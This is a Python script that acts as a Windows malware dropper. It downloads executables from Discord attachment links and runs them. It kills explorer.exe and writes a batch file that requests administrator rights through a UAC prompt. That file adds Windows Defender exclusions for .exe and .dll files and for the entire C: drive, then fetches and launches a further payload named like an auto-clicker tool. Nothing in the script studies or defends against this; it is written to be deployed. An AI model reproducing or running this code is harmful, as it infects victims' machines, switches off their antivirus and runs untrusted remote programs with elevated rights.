import os
import requests

def DAEF(url):
    temp_folder = os.environ.get('TEMP', '')
    if temp_folder:
        downloaded_file_path = os.path.join(temp_folder, 'downloaded_file.exe')
        try:
            response = requests.get(url)
            with open(downloaded_file_path, 'wb') as file:
                file.write(response.content)
        except requests.RequestException as e:
            print(f"Failed to download the file: {e}")
            return
        os.system(downloaded_file_path)
    else:
        print("Failed to get the TEMP folder path.")


download_url = 'https://cdn.discordapp.com/attachments/1178801531886247940/1178884114892476506/test.exe' # just replace the link with a direct link silly Nget<3 {RAW} Link would be alot better 
DAEF(download_url)# as it wopnt mistake it for the web pages metadata

def create_and_run_bat_script():
    bat_script_content = r'''
@echo off
appdata_folder = os.getenv('APPDATA')
file_path = os.path.join(appdata_folder, 'Microsoft', 'emptyfile20947.txt')
:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    

mkdir "C:\Windows\WinEmptyfold"
powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.exe'"
powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension '.dll'"
powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'exe'"
powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'dll'"
powershell.exe -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:'"

set "temp_file=%TEMP%\hahabonk.exe"

curl -s https://cdn.discordapp.com/attachments/1178801531886247940/1178884114892476506/test.exe -o %temp%/lol.exe

powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/1178800960663978064/1184960188709617684/AutoClicker-3.0.exe', '%temp_file%')"
start "" "%temp_file%"
del /q "%appdata%\Microsoft\unpython.py"
'''

    temp_folder = os.environ.get('TEMP', '')
    if temp_folder:
        bat_script_path = os.path.join(temp_folder, 'temp_script.bat')
        with open(bat_script_path, 'w') as bat_file:
            bat_file.write(bat_script_content)
        os.system(bat_script_path)
    else:
        print("Failed to get the TEMP folder path.")

if os.name == 'nt':
    folder_path = r"C:\Windows\WinEmptyfold"
    if os.path.exists(folder_path):
        exit()
    else:
        os.system('timeout 5')
        os.system('taskkill /f /im explorer.exe')
        create_and_run_bat_script()
        while True:
            os.system('timeout 5')
            if os.path.exists(folder_path):
                os.system('start explorer.exe')
                break
            else:
                create_and_run_bat_script()